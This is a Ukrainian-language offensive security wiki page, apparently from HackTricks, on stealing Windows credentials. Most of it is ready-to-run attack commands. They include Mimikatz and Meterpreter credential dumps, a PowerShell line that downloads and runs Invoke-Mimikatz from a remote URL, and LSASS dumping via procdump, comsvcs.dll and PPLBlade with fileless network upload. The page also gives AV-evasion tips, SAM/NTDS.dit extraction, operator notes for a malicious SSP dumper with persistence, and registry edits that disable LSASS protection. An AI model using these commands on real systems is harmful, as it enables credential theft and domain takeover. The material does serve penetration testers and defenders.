# Викрадення Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Знайдіть інші можливості, які Mimikatz може виконувати на** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Дізнайтеся про деякі можливі захисти credentials тут.**](credentials-protections.md) **Ці захисти можуть перешкодити Mimikatz витягти деякі credentials.**

## Credentials за допомогою Meterpreter

Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **який** я створив, щоб **шукати passwords і hashes** на машині жертви.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є офіційним інструментом Microsoft**, його не виявляє Defender.\
Ви можете використати цей інструмент, щоб **dump the lsass process**, **download the dump** і **extract** **credentials locally** from the dump.

Ви також можете використовувати [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Цей процес виконується автоматично за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **позначати як шкідливе** використання **procdump.exe to dump lsass.exe**, оскільки вони **виявляють** рядок **"procdump.exe" and "lsass.exe"**. Тому більш **менш помітно** **передавати** як **аргумент** **PID** процесу lsass.exe до procdump **замість** **name lsass.exe.**

### Дамп lsass за допомогою **comsvcs.dll**

DLL під назвою **comsvcs.dll**, що знаходиться в `C:\Windows\System32`, відповідає за **зняття дампу пам'яті процесу** у разі падіння. Ця DLL містить **функцію** з назвою **`MiniDumpW`**, призначену для виклику за допомогою `rundll32.exe`.\
Перші два аргументи не мають значення, але третій поділено на три компоненти. Ідентифікатор процесу, який потрібно зняти, є першою компонентою, місце збереження файлу дампу — другою, а третьою компонентою має бути строго слово **full**. Жодних альтернативних опцій немає.\
Після розбору цих трьох компонент DLL створює файл дампу та записує в нього пам'ять вказаного процесу.\
Використання **comsvcs.dll** дозволяє зняти дамп процесу lsass без необхідності завантажувати та запускати procdump. Цей метод детально описано на [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Для виконання використовується наступна команда:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ви можете автоматизувати цей процес за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Дамп lsass за допомогою Task Manager**

1. Клацніть правою кнопкою миші на Task Bar і виберіть Task Manager
2. Натисніть More details
3. Знайдіть процес "Local Security Authority Process" на вкладці Processes
4. Клацніть правою кнопкою на процесі "Local Security Authority Process" і виберіть "Create dump file".

### Дамп lsass за допомогою procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — підписаний Microsoft двійковий файл, який є частиною набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass за допомогою PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це Protected Process Dumper Tool, який підтримує obfuscating memory dump та передачу їх на remote workstations без запису на диск.

**Ключові функції**:

1. Обхід PPL protection
2. Obfuscating memory dump файлів для уникнення Defender signature-based detection mechanisms
3. Завантаження memory dump за допомогою RAW і SMB upload methods без запису на диск (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon постачає триетапний дампер під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тому EDR hooks на цей API ніколи не спрацьовують:

1. **Stage 1 loader (`lals.exe`)** – шукає в `fdp.dll` плейсхолдер, що складається з 32 малих символів `d`, перезаписує його абсолютним шляхом до `rtu.txt`, зберігає пропатчений DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливий DLL як новий Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, XORs кожний байт з `0x20`, і відображає декодований blob у пам'ять перед передачею виконання.
3. **Stage 3 dumper** – відображений payload перевідтворює логіку MiniDump, використовуючи **direct syscalls**, які резолвляться з хешованих імен API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Виділений експорт з іменем `Tom` відкриває `%TEMP%\<pid>.ddt`, стрімить стиснутий LSASS dump у файл і закриває дескриптор, щоб ексфільтрація могла відбутись пізніше.

Примітки оператора:

* Тримайте `lals.exe`, `fdp.dll`, `nfdp.dll`, і `rtu.txt` в одній теці. Stage 1 перезаписує жорсткокодований плейсхолдер абсолютним шляхом до `rtu.txt`, тож рознесення файлів по різних теках порушить ланцюжок.
* Реєстрація відбувається додаванням `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Ви можете запоповнити це значення самостійно, щоб LSASS перезавантажував SSP при кожному boot.
* Файли `%TEMP%\*.ddt` — це стиснуті дампи. Розпакуйте локально, потім передайте їх у Mimikatz/Volatility для отримання облікових даних.
* Запуск `lals.exe` вимагає прав admin/SeTcb, щоб `AddSecurityPackageA` пройшов успішно; після повернення виклику LSASS прозоро завантажує rogue SSP і виконує Stage 2.
* Видалення DLL з диска не виганяє його з пам'яті LSASS. Або видаліть запис у реєстрі та перезапустіть LSASS (reboot), або залиште його для довготривалої персистенції.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit з цільового DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump the NTDS.dit password history з цільового DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Викрадення SAM & SYSTEM

Ці файли повинні бути **розташовані** в _C:\windows\system32\config\SAM_ та _C:\windows\system32\config\SYSTEM._ Але **ви не можете просто скопіювати їх звичайним способом**, тому що вони захищені.

### З реєстру

Найпростіший спосіб викрасти ці файли — отримати їх копію з реєстру:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Завантажте** ці файли на вашу машину Kali та **витягніть hashes** використовуючи:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

За допомогою цієї служби ви можете копіювати захищені файли. Потрібно бути Адміністратором.

#### Використання vssadmin

Бінарний файл vssadmin доступний лише у версіях Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Але ви можете зробити те ж саме з **Powershell**. Ось приклад **як скопіювати SAM file** (жорсткий диск, що використовується — "C:" і він збережений у C:\users\Public), але ви можете використати це для копіювання будь-якого захищеного файлу:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Код із книги: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Нарешті, ви також можете використати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) для копіювання SAM, SYSTEM і ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Облікові дані - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: Ця таблиця відповідає за зберігання деталей про об'єкти, такі як користувачі та групи.
- **Link Table**: Вона відстежує зв'язки, такі як членство в групах.
- **SD Table**: **Security descriptors** для кожного об'єкта зберігаються тут, забезпечуючи безпеку та контроль доступу до збережених об'єктів.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Розшифрування хешів у NTDS.dit

The hash is cyphered 3 times:

1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. Decrypt tha **hash** using **PEK** and **RC4**.
3. Decrypt the **hash** using **DES**.

**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ви також можете використати [**volume shadow copy**](#stealing-sam-and-system) трюк, щоб скопіювати файл **ntds.dit**. Пам'ятайте, що вам також знадобиться копія файлу **SYSTEM** (знову ж таки, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) трюк).

### **Витяг хешів з NTDS.dit**

Після того, як ви **отримали** файли **NTDS.dit** та **SYSTEM**, ви можете використовувати інструменти на кшталт _secretsdump.py_, щоб **витягти хеші**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ви також можете **витягнути їх автоматично**, використовуючи дійсного користувача domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Для великих **NTDS.dit файлів** рекомендується витягувати їх за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Крім того, ви можете використовувати **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Витяг об'єктів домену з NTDS.dit в базу даних SQLite**

Об'єкти NTDS можна витягти в базу даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Витягуються не лише secrets, а й цілі об'єкти та їхні атрибути для подальшого аналізу інформації, якщо сирий файл NTDS.dit вже отримано.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive є необов'язковим, але дозволяє дешифрувати секрети (NT & LM hashes, supplemental credentials такі як cleartext passwords, kerberos або trust keys, NT & LM password histories). Окрім іншої інформації, витягуються наступні дані: user та machine accounts з їх хешами, UAC flags, timestamp останнього logon та зміни пароля, опис акаунтів, імена, UPN, SPN, groups та рекурсивні членства, дерево organizational units та членство, trusted domains з типом trusts, напрямком і атрибутами...

## Lazagne

Завантажте бінарний файл з [here](https://github.com/AlessandroZ/LaZagne/releases). Ви можете використовувати цей бінарний файл для extract credentials з кількох програм.
```
lazagne.exe all
```
## Інші інструменти для витягування облікових даних із SAM і LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для витягування облікових даних з пам'яті. Завантажити його з: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Витягує облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Витягти облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **запустіть його** і паролі будуть витягнуті.

## Збирання інформації про неактивні RDP-сесії та послаблення засобів захисту

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – розбирайте кожен user hive за шляхом `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожний субключ зберігає назву сервера, `UsernameHint`, та мітку часу останнього запису. Ви можете відтворити логіку FinalDraft за допомогою PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – опитуйте журнал `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` на предмет Event IDs **21** (успішний вхід) та **25** (відключення), щоб відобразити, хто адміністрував машину:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Після того, як ви дізналися, який Domain Admin регулярно підключається, дампьте LSASS (з LalsDumper/Mimikatz), поки їхня **відключена** сесія ще існує. CredSSP + NTLM fallback залишає їхній verifier та токени в LSASS, які потім можна відтворити через SMB/WinRM, щоб отримати `NTDS.dit` або розгорнути persistence на domain controllers.

### Зміни реєстру, на які націлений FinalDraft, щоб полегшити викрадення облікових даних

Той самий implant також змінює кілька ключів реєстру, щоб полегшити крадіжку облікових даних:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Встановлення `DisableRestrictedAdmin=1` змушує повне повторне використання облікових даних/квитків під час RDP, дозволяючи pivots у стилі pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` вимикає UAC token filtering, тому локальні адміністратори отримують необмежені токени по мережі.
* `DSRMAdminLogonBehavior=2` дозволяє адміністратору DSRM входити, поки DC онлайн, надаючи нападникам ще один вбудований обліковий запис з високими привілеями.
* `RunAsPPL=0` усуває захисти LSASS PPL, роблячи доступ до пам'яті тривіальним для дамперів, таких як LalsDumper.

## Джерела

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
